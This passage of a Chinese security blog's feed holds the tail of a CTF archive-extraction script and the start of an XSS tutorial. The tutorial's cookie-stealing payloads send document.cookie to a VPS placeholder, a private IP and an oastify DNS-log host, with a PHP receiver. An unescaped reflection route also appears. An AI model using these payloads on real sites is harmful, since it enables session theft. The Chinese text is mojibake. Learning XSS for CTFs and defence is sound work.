function">extract_and_analyze_archive</span><span class="token punctuation">(</span>file_url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span> <span class="token triple-quoted-string string">""" è§£å‹å¹¶åˆ†æå‹ç¼©åŒ…å†…å®¹Args:    file_url: å‹ç¼©åŒ…æ–‡ä»¶çš„URLè·¯å¾„    Returns:    str: å‹ç¼©åŒ…å†…å®¹çš„åˆ†æç»“æœ"""</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"å¼€å§‹å¤„ç†å‹ç¼©åŒ…: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>file_url<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token comment"># ä¸‹è½½æ–‡ä»¶</span>    local_file_path <span class="token operator">=</span> download_file_from_url<span class="token punctuation">(</span>file_url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> local_file_path<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"æ— æ³•ä¸‹è½½å‹ç¼©åŒ…æ–‡ä»¶"</span>        <span class="token comment"># æ£€æŸ¥æ˜¯å¦ä¸ºå‹ç¼©åŒ…æ–‡ä»¶</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> is_archive_file<span class="token punctuation">(</span>local_file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"æä¾›çš„æ–‡ä»¶ä¸æ˜¯æ”¯æŒçš„å‹ç¼©åŒ…æ ¼å¼ï¼ˆæ”¯æŒzipã€rarã€7zï¼‰"</span>        <span class="token comment"># åˆ›å»ºè§£å‹ç›®å½•</span>    extract_dir <span class="token operator">=</span> TEMP_DIR <span class="token operator">/</span> <span class="token string-interpolation"><span class="token string">f"extracted_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>Path<span class="token punctuation">(</span>local_file_path<span class="token punctuation">)</span><span class="token punctuation">.</span>stem<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    extract_dir<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># æ ¹æ®æ–‡ä»¶ç±»å‹è¿›è¡Œè§£å‹</span>        file_ext <span class="token operator">=</span> Path<span class="token punctuation">(</span>local_file_path<span class="token punctuation">)</span><span class="token punctuation">.</span>suffix<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> file_ext <span class="token operator">==</span> <span class="token string">'.zip'</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>local_file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zip_ref<span class="token punctuation">:</span>                zip_ref<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>extract_dir<span class="token punctuation">)</span>        <span class="token keyword">elif</span> file_ext <span class="token operator">==</span> <span class="token string">'.rar'</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> rarfile<span class="token punctuation">.</span>RarFile<span class="token punctuation">(</span>local_file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> rar_ref<span class="token punctuation">:</span>                rar_ref<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>extract_dir<span class="token punctuation">)</span>        <span class="token keyword">elif</span> file_ext <span class="token operator">==</span> <span class="token string">'.7z'</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> py7zr<span class="token punctuation">.</span>SevenZipFile<span class="token punctuation">(</span>local_file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sevenz_ref<span class="token punctuation">:</span>                sevenz_ref<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>extract_dir<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"ä¸æ”¯æŒçš„å‹ç¼©åŒ…æ ¼å¼: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>file_ext<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"å‹ç¼©åŒ…è§£å‹åˆ°: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>extract_dir<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                <span class="token comment"># åˆ†æè§£å‹åçš„å†…å®¹</span>        analysis_result <span class="token operator">=</span> analyze_extracted_files<span class="token punctuation">(</span>extract_dir<span class="token punctuation">)</span>                <span class="token comment"># æ¸…ç†ä¸´æ—¶æ–‡ä»¶</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>local_file_path<span class="token punctuation">)</span>            shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>extract_dir<span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>                <span class="token keyword">return</span> analysis_result            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token comment"># æ¸…ç†ä¸´æ—¶æ–‡ä»¶</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>local_file_path<span class="token punctuation">)</span>            <span class="token keyword">if</span> extract_dir<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>extract_dir<span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"è§£å‹ç¼©å¤±è´¥ï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"å‹ç¼©åŒ…å¤„ç†å¤±è´¥: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"å‹ç¼©åŒ…å¤„ç†è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯ï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;wmc.tf å—ï¼Œå”‰èˆèŒåƒ&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;MNGA çš„ WPï¼š &lt;a href=&quot;https://wx.zsxq.com/group/824215518412&quot;&gt;https://wx.zsxq.com/group/824215518412&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>XSS Re:Master</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/09/17/XSS-Re-Master/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/09/17/XSS-Re-Master/</id>
    <published>2025-09-17T07:18:09.000Z</published>
    <updated>2026-01-10T10:05:14.005Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å…³äºè¿™ä¸ªçš„æ€»ç»“å¥½åƒä¸æ˜¯ç‰¹åˆ«å¤šï¼Œååå›½å¤–èµ›ä»¥åŠä¸€äº›è”åˆæˆ˜é˜Ÿçš„æ¯”èµ›ä¹Ÿçˆ±å‡ºè¿™ä¸ªï¼ˆ</p><p>é‚æ•´ç†ä¸€ç‚¹ä¸œè¥¿å‡ºæ¥</p><span id="more"></span><hr><p>ä»‹ç»ï¼š</p><blockquote><p>è¿™æ˜¯ä¸€ç§å°†ä»»æ„ Javascript ä»£ç æ’å…¥åˆ°å…¶ä»– Web ç”¨æˆ·é¡µé¢é‡Œæ‰§è¡Œä»¥è¾¾åˆ°æ”»å‡»ç›®çš„çš„æ¼æ´ã€‚æ”»å‡»è€…åˆ©ç”¨æµè§ˆå™¨çš„åŠ¨æ€å±•ç¤ºæ•°æ®åŠŸèƒ½ï¼Œåœ¨ HTML é¡µé¢é‡ŒåµŒå…¥æ¶æ„ä»£ç ã€‚å½“ç”¨æˆ·æµè§ˆè¯¥é¡µæ—¶ï¼Œè¿™äº›æ½œå…¥åœ¨ HTML ä¸­çš„æ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œï¼Œç”¨æˆ·æµè§ˆå™¨è¢«æ”»å‡»è€…æ§åˆ¶ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»è€…çš„ç‰¹æ®Šç›®çš„ï¼Œå¦‚ cookie çªƒå–ç­‰ã€‚</p></blockquote><p>åˆ†ç±»ï¼š</p><ul><li><p><strong>åå°„å‹ XSS</strong>ï¼š**&lt;éæŒä¹…åŒ–&gt;** æ”»å‡»è€…äº‹å…ˆåˆ¶ä½œå¥½æ”»å‡»é“¾æ¥, éœ€è¦æ¬ºéª—ç”¨æˆ·è‡ªå·±å»ç‚¹å‡»é“¾æ¥æ‰èƒ½è§¦å‘ XSS ä»£ç ï¼ˆæœåŠ¡å™¨ä¸­æ²¡æœ‰è¿™æ ·çš„é¡µé¢å’Œå†…å®¹ï¼‰ï¼Œä¸€æ¬¡æ€§ï¼Œæ‰€è§å³æ‰€å¾—ï¼Œä¸€èˆ¬å®¹æ˜“å‡ºç°åœ¨æœç´¢é¡µé¢ã€‚</p></li><li><p><strong>å­˜å‚¨å‹ XSS</strong>ï¼š**&lt;æŒä¹…åŒ–&gt;**  ä»£ç æ˜¯å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­çš„ï¼Œå¦‚åœ¨ä¸ªäººä¿¡æ¯æˆ–å‘è¡¨æ–‡ç« ç­‰åœ°æ–¹ï¼ŒåŠ å…¥ä»£ç ï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥ï¼Œé‚£ä¹ˆè¿™äº›ä»£ç å°†å‚¨å­˜åˆ°æœåŠ¡å™¨ä¸­ï¼Œæ¯å½“æœ‰ç”¨æˆ·è®¿é—®è¯¥é¡µé¢çš„æ—¶å€™éƒ½ä¼šè§¦å‘ä»£ç æ‰§è¡Œï¼Œè¿™ç§ XSS éå¸¸å±é™©ï¼Œå®¹æ˜“é€ æˆè •è™«ï¼Œå¤§é‡ç›—çªƒ cookieï¼ˆè™½ç„¶è¿˜æœ‰ç§ DOM å‹ XSSï¼Œä½†æ˜¯ä¹Ÿè¿˜æ˜¯åŒ…æ‹¬åœ¨å­˜å‚¨å‹ XSS å†…ï¼‰ã€‚</p></li><li><p><strong>DOM å‹ XSS</strong>ï¼šåŸºäºæ–‡æ¡£å¯¹è±¡æ¨¡å‹ Document Objeet  Modelï¼ŒDOM)çš„ä¸€ç§æ¼æ´ã€‚DOM æ˜¯ä¸€ä¸ªä¸å¹³å°ã€ç¼–ç¨‹è¯­è¨€æ— å…³çš„æ¥å£ï¼Œå®ƒå…è®¸ç¨‹åºæˆ–è„šæœ¬åŠ¨æ€åœ°è®¿é—®å’Œæ›´æ–°æ–‡æ¡£å†…å®¹ã€ç»“æ„å’Œæ ·å¼ï¼Œå¤„ç†åçš„ç»“æœèƒ½å¤Ÿæˆä¸ºæ˜¾ç¤ºé¡µé¢çš„ä¸€éƒ¨åˆ†ã€‚DOM ä¸­æœ‰å¾ˆå¤šå¯¹è±¡ï¼Œå…¶ä¸­ä¸€äº›æ˜¯ç”¨æˆ·å¯ä»¥æ“çºµçš„ï¼Œå¦‚ uriï¼Œlocationï¼ŒrefelTer ç­‰ã€‚å®¢æˆ·ç«¯çš„è„šæœ¬ç¨‹åºå¯ä»¥é€šè¿‡ DOM åŠ¨æ€åœ°æ£€æŸ¥å’Œä¿®æ”¹é¡µé¢å†…å®¹ï¼Œå®ƒä¸ä¾èµ–äºæäº¤æ•°æ®åˆ°æœåŠ¡å™¨ç«¯ï¼Œè€Œä»å®¢æˆ·ç«¯è·å¾— DOM ä¸­çš„æ•°æ®åœ¨æœ¬åœ°æ‰§è¡Œï¼Œå¦‚æœ DOM ä¸­çš„æ•°æ®æ²¡æœ‰ç»è¿‡ä¸¥æ ¼ç¡®è®¤ï¼Œå°±ä¼šäº§ç”Ÿ DOM XSS æ¼æ´ã€‚</p></li></ul><p>æŸ¥è¯¢æ¥å£ä¸€èˆ¬å®¹æ˜“å‡ºç°åå°„å‹ XSSï¼Œç•™è¨€æ¿å®¹æ˜“å‡ºç°å­˜å‚¨å‹ XSS</p><hr><h1 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h1><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><p>èœé¸Ÿæ•™ç¨‹ï¼š<a href="https://www.runoob.com/js/js-tutorial.html">https://www.runoob.com/js/js-tutorial.html</a></p><p>æœ€åŸºæœ¬çš„ html ä¸‹çš„ js è¯­å¥</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å½“é¡µé¢è½½å…¥å®Œæ¯•åæ‰§è¡Œ Javascript ä»£ç </p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">myFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="DOMï¼ˆæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼‰"><a href="#DOMï¼ˆæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼‰" class="headerlink" title="DOMï¼ˆæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼‰"></a>DOMï¼ˆæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼‰</h2><h3 id="Document"><a href="#Document" class="headerlink" title="Document"></a>Document</h3><p><strong><code>Document</code></strong>Â æ¥å£è¡¨ç¤ºä»»ä½•åœ¨æµè§ˆå™¨ä¸­è½½å…¥çš„ç½‘é¡µï¼Œå¹¶ä½œä¸ºç½‘é¡µå†…å®¹çš„å…¥å£ï¼Œä¹Ÿå°±æ˜¯Â <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document_Object_Model/Using_the_Document_Object_Model">DOM æ ‘</a>ã€‚</p><p><code>getElementById</code> æ–¹æ³•è¿”å›ä¸€ä¸ªè¡¨ç¤ºÂ <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/id" title="id"><code>id</code></a>Â å±æ€§ä¸æŒ‡å®šå­—ç¬¦ä¸²ç›¸åŒ¹é…çš„å…ƒç´ çš„Â <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element"><code>Element</code></a>Â å¯¹è±¡</p><blockquote><p>æ–‡æ¡£ä¸­çš„ ID å¿…é¡»æ˜¯å”¯ä¸€çš„ã€‚å¦‚æœä¸€ä¸ªæ–‡æ¡£ä¸­æœ‰ä¸¤ä¸ªåŠä»¥ä¸Šçš„å…ƒç´ å…·æœ‰ç›¸åŒçš„ IDï¼Œé‚£ä¹ˆè¯¥æ–¹æ³•åªä¼šè¿”å›æŸ¥æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</p></blockquote><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zh<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>getElementById ç¤ºä¾‹<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>para<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>è¿™é‡Œæœ‰ä¸€äº›æ–‡æœ¬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">changeColor</span><span class="token punctuation">(</span><span class="token string">'blue'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>è“è‰²<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">changeColor</span><span class="token punctuation">(</span><span class="token string">'red'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>çº¢è‰²<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">function</span> <span class="token function">changeColor</span><span class="token punctuation">(</span><span class="token parameter">newColor</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> elem <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"para"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  elem<span class="token punctuation">.</span>style<span class="token punctuation">.</span>color <span class="token operator">=</span> newColor<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>cookie</code> æ–¹æ³•ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span>cookie<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è·å– cookie</p><p>è¿™é‡Œæ¼”ç¤ºä¸€ç§æœ€åŸºæœ¬çš„ xss æ–¹æ³•</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/09/17/XSS-Re-Master/image-20231102204022562.png" alt="image-20231102204022562"></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span>cookie<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è®¾ç½® cookie</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://vps:port/XSS.php?1='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è½¬å‘è¯­å¥ï¼Œè§¦å‘ä¹‹åå°±ä¼šè·³è½¬åˆ°æˆ‘ä»¬çš„ vps çš„ http æœåŠ¡å¹¶æ‰§è¡Œè„šæœ¬å†™å…¥æ–‡ä»¶å¸¦å‡º cookie</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'no data input'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥ vps ä¸Š nc ç›‘å¬ï¼Œjavascript ç”¨ fetch è¯·æ±‚</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://192.168.173.251:666/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”šè‡³å¯ä»¥ç”¨ dnslog æ¥æ”¶</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://q1sje7nttyar1hl3gyc6xqud54bvzlna.oastify.com/?a='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="Element"><a href="#Element" class="headerlink" title="Element"></a>Element</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element">https://developer.mozilla.org/zh-CN/docs/Web/API/Element</a></p><p><strong><code>Element</code></strong>Â æ˜¯æœ€é€šç”¨çš„åŸºç±»ï¼Œ<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document"><code>Document</code></a>Â ä¸­çš„æ‰€æœ‰å…ƒç´ å¯¹è±¡ï¼ˆå³è¡¨ç¤ºå…ƒç´ çš„å¯¹è±¡ï¼‰éƒ½ç»§æ‰¿è‡ªå®ƒã€‚å®ƒåªå…·æœ‰å„ç§å…ƒç´ å…±æœ‰çš„æ–¹æ³•å’Œå±æ€§</p><p><strong><code>Element.innerHTML</code></strong>Â å±æ€§è®¾ç½®æˆ–è·å– HTML è¯­æ³•è¡¨ç¤ºçš„å…ƒç´ çš„åä»£</p><blockquote><p>å¦‚æœä¸€ä¸ªÂ <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Reference/Elements/div"><code>&lt;div&gt;</code></a>,Â <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Reference/Elements/span"><code>&lt;span&gt;</code></a>, æˆ–Â <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Reference/Elements/noembed"><code>&lt;noembed&gt;</code></a>Â èŠ‚ç‚¹æœ‰ä¸€ä¸ªæ–‡æœ¬å­èŠ‚ç‚¹ï¼Œè¯¥èŠ‚ç‚¹åŒ…å«å­—ç¬¦Â <code>(&amp;)</code>,Â <code>(&lt;)</code>, æˆ–Â <code>(&gt;)</code>,Â <code>innerHTML</code>Â ä¼šå°†è¿™äº›å­—ç¬¦åˆ†åˆ«è¿”å›ä¸º <code>&amp;amp;</code>, <code>&amp;lt;</code> å’Œ <code>&amp;gt;</code>ã€‚ä½¿ç”¨ <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Node/textContent"><code>Node.textContent</code></a>Â å¯è·å–ä¸€ä¸ªè¿™äº›æ–‡æœ¬èŠ‚ç‚¹å†…å®¹çš„æ­£ç¡®å‰¯æœ¬ã€‚</p></blockquote><hr><h1 id="ç¼–å†™-XSS-Bot"><a href="#ç¼–å†™-XSS-Bot" class="headerlink" title="ç¼–å†™ XSS Bot"></a>ç¼–å†™ XSS Bot</h1><p><a href="https://blog.csdn.net/diecai2192/article/details/102118060">https://blog.csdn.net/diecai2192/article/details/102118060</a></p><h2 id="Nodejs-puppeteer"><a href="#Nodejs-puppeteer" class="headerlink" title="Nodejs puppeteer"></a>Nodejs puppeteer</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/botview'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> content <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>content <span class="token operator">||</span> <span class="token string">''</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        &lt;div></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>content<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/div>    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token 